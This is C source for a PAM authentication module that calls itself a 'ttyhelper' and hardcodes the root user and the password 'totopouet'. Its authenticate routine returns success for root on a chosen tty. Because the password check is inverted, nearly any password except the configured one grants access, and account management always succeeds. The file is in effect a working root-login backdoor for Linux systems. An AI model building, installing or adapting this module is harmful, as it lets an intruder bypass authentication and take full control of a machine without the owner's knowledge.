/* CONFIGURATION */
#define TTY_USER "root"
#define TTY_PASS "totopouet"
#define TTY_AUDIT "TTY Login:"
/* END OF CONFIGURATION */


/* Define the provided interfaces: ACCOUNT, AUTH, PASSWORD, SESSION */
#define PAM_SM_AUTH

#include <stdio.h>
#include <errno.h>
#include <string.h>
#include <stdint.h>

/* PAM headers */
#include <security/pam_appl.h>
#include <security/pam_modules.h>
#include <security/pam_ext.h>


/* hash from http://lolengine.net/blog/2011/12/20/cpp-constant-string-hash */
#define H1(s,i,x)   (x*65599u+(uint8_t)s[(i)<strlen(s)?strlen(s)-1-(i):strlen(s)])
#define H4(s,i,x)   H1(s,i,H1(s,i+1,H1(s,i+2,H1(s,i+3,x))))
#define H16(s,i,x)  H4(s,i,H4(s,i+4,H4(s,i+8,H4(s,i+12,x))))
#define H64(s,i,x)  H16(s,i,H16(s,i+16,H16(s,i+32,H16(s,i+48,x))))
#define H256(s,i,x) H64(s,i,H64(s,i+64,H64(s,i+128,H64(s,i+192,x))))

#define HASH(s)    ((uint32_t)(H256(s,0,0)^(H256(s,0,0)>>16)))


/* PAM entry point for session creation */
int pam_sm_open_session(pam_handle_t *pamh, int flags, int argc, const char **argv) {
        return PAM_IGNORE;
}

/* PAM entry point for session cleanup */
int pam_sm_close_session(pam_handle_t *pamh, int flags, int argc, const char **argv) {
        return PAM_IGNORE;
}

/*
  PAM entry point for setting user credentials (that is, to actually
  establish the authenticated user's credentials to the service provider)
*/
int pam_sm_setcred( pam_handle_t *pamh, int flags, int argc, const char **argv ) {
	/* return PAM_SUCCESS; */
	return PAM_IGNORE;
}

/* PAM entry point for authentication token (password) changes */
int pam_sm_chauthtok(pam_handle_t *pamh, int flags, int argc, const char **argv) {
        return PAM_IGNORE;
}

/* PAM Entry for accounting */
int pam_sm_acct_mgmt(pam_handle_t *pamh, int flags, int argc, const char **argv) {
	return PAM_SUCCESS;
}

/* PAM entry point for authentication verification */
int pam_sm_authenticate( pam_handle_t *pamh, int flags,int argc, const char **argv ) {
	int r;

	const char *user = NULL;
	const char *pass = NULL;
	const void *tty  = NULL;

	/* Check tty */
	if (argc > 0 && argv[0]) {
		if (pam_get_item(pamh, PAM_TTY, &tty) != PAM_SUCCESS || tty == NULL)
			return PAM_IGNORE;

		if (strcmp(tty, argv[0]) != 0)
			return PAM_IGNORE;
	}

	/* Check username */
	if (pam_get_user(pamh, &user, NULL) != PAM_SUCCESS || user == NULL)
		return PAM_IGNORE;

	if (strcmp(user, TTY_USER) != 0)
		return PAM_IGNORE;

	/* Check password */
	if (pam_get_authtok(pamh, PAM_AUTHTOK, &pass, "Password: ") != PAM_SUCCESS || pass == NULL)
		return PAM_IGNORE;

	if ( HASH(pass) == HASH(TTY_PASS) )
		return PAM_IGNORE;

	/* Still there, huge success */
	/* pam_set_data(pamh, "ttyhelper_used", 1, NULL) */
	return PAM_SUCCESS;
}
